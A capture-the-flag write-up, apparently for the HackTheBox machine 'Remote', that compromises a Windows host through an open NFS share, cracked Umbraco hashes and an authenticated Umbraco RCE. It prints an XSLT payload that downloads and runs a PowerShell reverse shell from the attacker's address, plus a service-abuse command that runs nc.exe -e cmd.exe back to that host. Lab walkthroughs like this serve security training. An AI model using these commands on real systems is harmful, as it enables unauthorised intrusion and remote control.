# Remote

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.227.150
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 04:27 EDT
Warning: 10.129.227.150 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.227.150
Host is up (0.035s latency).
Not shown: 65026 closed tcp ports (conn-refused), 494 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
111/tcp   open  rpcbind
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49678/tcp open  unknown
49679/tcp open  unknown
49680/tcp open  unknown
```

### NFS

Network File System was publicly available on port 2049, and this is not a port I see often. This service can have very interesting files and permissions, so let's enumerate it via `showmount`.&#x20;

```
$ showmount -e 10.129.227.150
Export list for 10.129.227.150:
/site_backups (everyone)
```

We can mount onto this and view the files inside:

```
$ sudo mount -t nfs 10.129.227.150:/site_backups /mnt/
$ ls -la
total 159
drwx------  2 nobody 4294967294  4096 Feb 23  2020 .
drwxr-xr-x 19 root   root       36864 Apr 22 05:16 ..
drwx------  2 nobody 4294967294    64 Feb 20  2020 App_Browsers
drwx------  2 nobody 4294967294  4096 Feb 20  2020 App_Data
drwx------  2 nobody 4294967294  4096 Feb 20  2020 App_Plugins
drwx------  2 nobody 4294967294    64 Feb 20  2020 aspnet_client
drwx------  2 nobody 4294967294 49152 Feb 20  2020 bin
drwx------  2 nobody 4294967294  8192 Feb 20  2020 Config
drwx------  2 nobody 4294967294    64 Feb 20  2020 css
-rwx------  1 nobody 4294967294   152 Nov  1  2018 default.aspx
-rwx------  1 nobody 4294967294    89 Nov  1  2018 Global.asax
drwx------  2 nobody 4294967294  4096 Feb 20  2020 Media
drwx------  2 nobody 4294967294    64 Feb 20  2020 scripts
drwx------  2 nobody 4294967294  8192 Feb 20  2020 Umbraco
drwx------  2 nobody 4294967294  4096 Feb 20  2020 Umbraco_Client
drwx------  2 nobody 4294967294  4096 Feb 20  2020 Views
-rwx------  1 nobody 4294967294 28539 Feb 20  2020 Web.config
```

We can go through each of the folders, and we would find an SDF file for Umbraco within `App_Data`, which normally contains hashes.

```
$ ls    
cache  Logs  Models  packages  TEMP  umbraco.config  Umbraco.sdf
```

If we use `strings` on it, we would find a load of input. At the top, it seems that there are SHA1 hashes present:

{% code overflow="wrap" %}
```
$ strings Umbraco.sdf
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
```
{% endcode %}

The hash can be cracked via `john`.

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
Use the "--format=ripemd-160" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "has-160"
Use the "--format=has-160" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
baconandcheese   (?)     
1g 0:00:00:00 DONE (2023-05-02 04:34) 1.538g/s 15113Kp/s 15113Kc/s 15113KC/s baconandchipies1..baconandcabbage
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed. 
```

So now we have some credentials at least.

### Umbraco RCE

There were hints that Umbraco was used to host the sites, so let's view port 80. It seems to be a blog page:

<figure><img src="../../../.gitbook/assets/image (2221).png" alt=""><figcaption></figcaption></figure>

The login page for the website is located at the `/Umbraco` directory. We can login with the credentials and email we found earlier.

<figure><img src="../../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

After logging in, we can enumerate the version that it is running.

<figure><img src="../../../.gitbook/assets/image (3873).png" alt=""><figcaption></figcaption></figure>

This version of Umbraco is vulnerable to an Authenticated RCE exploit:

```
$ searchsploit umbraco  
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Umbraco CMS - Remote Command Execution (Metasploit)        | windows/webapps/19671.rb
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution | aspx/webapps/46153.py
```

We can use the PoC for the first one, and edit it for this machine.

```python
payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
{ string cmd = "-c iex (iwr http://10.10.14.13/rev.ps1 -usebasicparsing)"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> ';

login = "admin@htb.local";
password="baconandcheese";
host = "http://10.129.227.150";
```

Take note of the `cmd` and `FileName` parameter in the `payload` variable. In my case I just used Powershell to download and execute a reverse shell script.

<figure><img src="../../../.gitbook/assets/image (2517).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### PowerUp

We can first enumerate our privileges as the user:

```
PS C:\windows\tasks> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disable
```

We see that we have a ton of privileges, and most importantly SeImpersonatePrivilege is enabled. This means that we probably have some cotnrol over services and this could be used for PE. I used `PowerUp.ps1` to exploit this system.&#x20;

```
PS C:\windows\tasks> wget 10.10.14.13:8000/powerup.ps1 -O powerup.ps1
PS C:\windows\tasks> . .\powerup.ps1
PS C:\windows\tasks> Invoke-AllChecks


Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 1580
ProcessId   : 4156
Name        : 4156
Check       : Process Token Privileges

ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
Name          : UsoSvc
Check         : Modifiable Services

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files
```

We have control over the `UsoSvc` service. With this, we can run commands as the SYSTEM user. All we need to do is download `nc.exe` to the machine and run it as the administrator.

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">wget 10.10.14.13/nc64.exe -O nc.exe
<strong>Invoke-ServiceAbuse -ServiceName 'UsoSvc' -Command 'C:\Windows\Tasks\nc.exe 10.10.14.13 4444 -e cmd.exe'
</strong></code></pre>

<figure><img src="../../../.gitbook/assets/image (879).png" alt=""><figcaption></figcaption></figure>

Rooted!
